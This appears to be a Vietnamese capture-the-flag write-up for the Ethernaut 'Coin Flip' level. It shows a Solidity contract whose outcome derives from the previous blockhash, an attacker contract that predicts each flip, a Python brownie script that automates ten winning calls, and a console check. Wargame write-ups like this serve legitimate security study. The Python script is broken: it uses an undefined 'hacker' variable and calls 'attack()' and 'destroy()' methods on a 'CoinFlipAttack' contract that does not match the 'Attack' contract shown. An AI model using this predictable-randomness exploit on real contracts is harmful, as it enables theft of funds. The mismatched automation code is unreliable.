# Level 3: Coin Flip
## ★★☆☆☆
## Given contract
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {

  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```
## Phân tích
- Việc để đoán đúng 10 lần flip liên tiếp gần như là bất khả thi, ta sẽ tìm 1 cách khác.
- Trong contract ta để ý biến side được tính toán và sau đó so sánh đối số _guess :
```
    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;

```
- Điều chúng ta cần làm là tách function ra 1 cái riêng để tính toán là xong.

## Solution
**Target**: 10 lần consecutive win liên tiếp.  

- Compile và deploy contract này trên remix, sau đó gọi hàm ``flip()`` 10 lần:  

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.6 <0.9.0;
contract Attack {
    CoinFlip private immutable target;
    uint256 private constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = CoinFlip(_target);
    }

    function flip() external {
        bool guess = _guess();
        require(target.flip(guess), "guess failed");
    }

    function _guess() private view returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        return coinFlip == 1 ? true : false;
    }
}
```
- Một script bằng python để automate quá trình này cho nhanh:  
```python
from brownie import accounts, config, interface, web3, CoinFlip, CoinFlipAttack

def attack(target, account):
    deploy_attack = CoinFlipAttack.deploy(target, {"from": hacker})
    coinflip = CoinFlip.at(target)
    print(f'Address originating the attack:  {deploy_attack.address}')
    for i in range (0, 10):
        deploy_attack.attack({'from': account, 'gas_limit':250000, 'allow_revert': True})
    print(f'Number:  {coinflip.consecutiveWins()}')
    deploy_attack.destroy({'from': account})
    
def main(target):
    account = accounts.add(config['wallets']['from_key'])
    attack(target, account)
```
> Note: Thư viện ``brownie`` cung cấp cho ta các phương thức để communicate với ethereum network tương tự như ví metamask.
- Check lại số lần win:
```javascript
await contract.consecutiveWins
10
```
**Submit** -> Done

## Reference


